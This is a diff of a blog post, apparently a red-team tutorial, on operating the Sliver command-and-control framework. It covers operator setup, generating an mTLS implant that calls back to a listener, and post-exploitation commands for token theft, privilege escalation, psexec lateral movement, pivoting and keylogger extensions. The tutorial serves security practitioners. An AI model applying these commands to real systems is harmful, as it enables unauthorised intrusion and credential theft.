@@ -6,9 +6,9 @@ draft: false
 
 [Sliver](https://github.com/BishopFox/sliver) is an open-source multi-operator command and control framework written in Go and named after [a species from Magic the Gathering](https://github.com/BishopFox/sliver/wiki#sure-but-whats-a-sliver). It is maintained by BishopFox and offers a big feature set and a beautiful CLI.
 
-However, I did not find much documentation on the more advanced features, except for Slivers `help` menu (which is excellent by the way). That is why I document some of its features in this post. The project is actively developed, so the below is subject to change and may not work in future versions of the framework.
+However, I did not find much documentation on the more advanced features, except for Slivers `help` menu (which is excellent by the way), which is why I documented some of its features in this post. The project is still actively developed though, so the below is subject to change and may not work in future versions of the framework.
 
-Sliver features staged and stageless payloads, implants for Windows, Linux & macOS, malleable C2 over HTTP(S) as well as C2 over mTLS, WireGuard and DNS. It also fits all your basic C2 needs: execute-assembly, socks proxy, port forwarding, you name it. Additionally, an extension management system (armory) offers some additions and customization options. 
+Sliver features staged and stageless payloads, implants for Windows, Linux & macOS, malleable C2 over HTTP(S) as well as C2 over mTLS, WireGuard and DNS. It also has all your basic C2 needs: execute-assembly, socks proxies, port forwarding, you name it. Additionally, an extension management system (armory) offers customization options. 
 
 IMO Sliver is a great free and open-source replacement for Cobalt Strike.
 
@@ -28,7 +28,7 @@ sliver-server
 
 ![](/sliver.png)
 
-Now first we have to create an operator config file. These files contain authentication and connection info for your team server.
+Now first we have to add a new operator by creating an operator config file. These files contain authentication and connection info for your team server.
 
 ```bash
 new-operator --name eversinc33 --lhost 127.0.0.1
@@ -42,21 +42,21 @@ Finally, enable multiplayer mode, to allow operator login:
 multiplayer
 ```
 
-If you have connection errors with the Sliver-client, it is likely that you forgot to run the above command, as it needs to be run every time you start the server.
-
 To connect to the server as an operator, run `sliver-client` and select your configuration file, if there are multiple.
+
+If you have connection errors with the Sliver-client, it is likely that you forgot to run the above `multiplayer` command, as it needs to be run every time the server is started.
 
 ### Generating Implants
 
 There are many options for generating implants and I recommend to read through them all with `help generate`. Note that by default a `session`-implant is generated, which communicates in a real time fashion. To generate a `beacon` implant, that periodically checks back for tasks, use `generate beacon`. Staged implants can be generated with `generate stager`. All your implants can be listed with `implants` and regenerated with `regenerate IMPLANT_NAME`.
 
-I generated the shellcode for an mTLS-based implant here. Compilation may take some time. 
+I generate the shellcode for an mTLS-based implant here. Compilation may take some time. 
 
 ```bash
 generate -N IMPLANT_NAME --mtls 192.168.2.129 -f shellcode -s /tmp/sliver.bin
 ```
 
-Besides `shellcode`, you can also generate an `exe`, a dynamic library (`shared`) or a `service`to use for `psexec`.
+Besides `shellcode`, you can also generate an `exe`, a dynamic library (`shared`) or a `service` to use for `psexec`.
 
 Don't forget to start the listener with, in this case, `mtls`.
 
@@ -70,7 +70,7 @@ We can start to interact with our agent with `use <ID>`. List available sessions
 
 ![](/listsessions.png)
 
-Sliver has many powerful features. If you type `help` in a session, you can see a list of all of them. If you have experience working with Cobalt Strike or meterpreter, many of them will be familiar, which makes Sliver feel quite "natural" and have an easy learning curve. 
+Sliver has many powerful features. If you type `help` in a session, you can see a list of all of them. If you have some experience working with Cobalt Strike or meterpreter, many of them will be familiar, which makes Sliver feel quite "natural" and have an easy learning curve. 
 
 There are many basic commands available, such as `upload` and `download`, `ls` and `cd`, `cat`, `execute` (run any shell command), `netstat` or `screenshot`. 
 
@@ -84,7 +84,7 @@ execute-assembly
 
 > With `execute-assembly` we can run a .NET assembly (DLL or exe) in memory, by spawning a new process (notepad by default) that hosts the .NET-CLR. With the `-X` flag, the tool output is automatically saved to `~/.sliver/loot`.
 
-> This can however be a bit tedious, since as of now there is no path autocompletion, but that is not that much of a problem when working with aliases, which I will explain at the end..
+> This can however be a bit tedious, since as of now there is no path autocompletion, but that is not that much of a problem anymore, when working with aliases (which I will explain in the next chapter below).
 
 ```
 getsystem
@@ -116,11 +116,11 @@ pivots
 
 > Start the pipe listener in your session/beacon and name your pipe (e.g. intercom): `pivots named-pipe intercom`. Then generate a named-pipe implant, e.g. `generate --named-pipe //./pipe/intercom`. Don't forget the pipe prefix here (`//./pipe`).
 
-> Upon launching your implant, if it can reach your other implant, it will link and communicate over that implant to the team server.
+> Upon launching your implant, if it can reach the other implant that will act as a pivot listener, it will link and communicate over that implant to the team server.
 
 > ![](/namedpipe.png)
 
-> This is also really useful if your target can not directly communicate with your team server, e.g. due to firewalls.
+> This is also really useful if your target can not directly communicate with your team server, e.g. due to a firewall blocking outbound traffic.
 
 ```
 impersonate
@@ -128,13 +128,13 @@ make-token
 rev2self
 ```
 
-> `ìmpersonate` and `make-token` allow you to play around with Windows access tokens. The former allows you to steal the token of another process, if you have the privileges to access it (e.g. when you are SYSTEM on a machine and want the token of another logged-in user). The latter allows you to impersonate a user by forging an access token, if you know the credentials. I don't think there is a command like Cobalt Strike's `kerberos_ticket_use`, where you can inject a kerberos ticket into your session, but maybe that will come (or correct me if I missed it). `rev2self` reverts the token to the original access token of that session.
+> `ìmpersonate` and `make-token` allow you to play around with Windows access tokens. The former allows you to steal the token of another process, if you have the privileges to access it (e.g. when you are SYSTEM on a machine and want the token of another logged-in user). The latter allows you to impersonate a user by forging an access token, if you know the credentials. As the time of writing this, there is no command yet like Cobalt Strike's `kerberos_ticket_use`, where you can inject a kerberos ticket into your session. `rev2self` reverts the token to the original access token of that session.
 
 ```
 psexec
 ```
 
-> `psexec` allows you to easily jump to another host by creating a service with psexec (duh). To do that, you need to first create an implant profile with `profiles new`, which acts as a template for the service binary that will be deployed.
+> `psexec` allows you to easily jump to another host by creating a service with psexec (duh). To do that, you need to first create an implant profile with `profiles new`, which will act as a template for the service binary that will be deployed.
 
 ```
 sideload
@@ -158,7 +158,7 @@ msf
 
 > ![](/msf1.png)
 
-> Even though it errors with an empty response, we get back a meterpreter shell:
+> Even though it errors with an empty response, we get a meterpreter shell back:
 
 > ![](/msf.png)
 
@@ -166,15 +166,15 @@ Obviously those are not all commands, but rather some that I found interesting. 
 
 ## Extending Sliver
 
-Using armory, Sliver's built-in repository for extensions, we can easily install extensions, such as a keylogger, Beacon-Object-Files or aliases for several well-known .NET-based tools.
+Using armory, Sliver's built-in repository for extensions, we can easily install extensions, such as a keylogger, some Beacon-Object-Files or aliases for several well-known .NET-based tools.
 
-Aliases are basically a thin wrapper around `execute-assembly`. As such, instead of having to type out `execute-assembly /path/to/sharphound`, I can now simply type `sharp-hound-3`. 
+Aliases are basically wrappers around `execute-assembly`. As such, instead of having to type out `execute-assembly /path/to/sharphound`, you can then simply type the name of the wrapper, e.g. here with SharpHound: 
 
 ![](/bloodhound.png)
 
 Aliases for your own tools can be quickly created, as they are just a [json-file that describes the assembly](https://github.com/BishopFox/sliver/blob/928faad39a07e999bb67d4d66054052387342f5c/client/command/exec/msf-inject.gos).
 
-Another way to use armory is that you as a team could set up your own armory-repository that includes your internal tooling and that can be used by all operators.
+Another fun way to use armory is that your team could set up your own armory-repository, that includes your internal tooling and can be used by all operators.
 
 ## Other takeaways
 
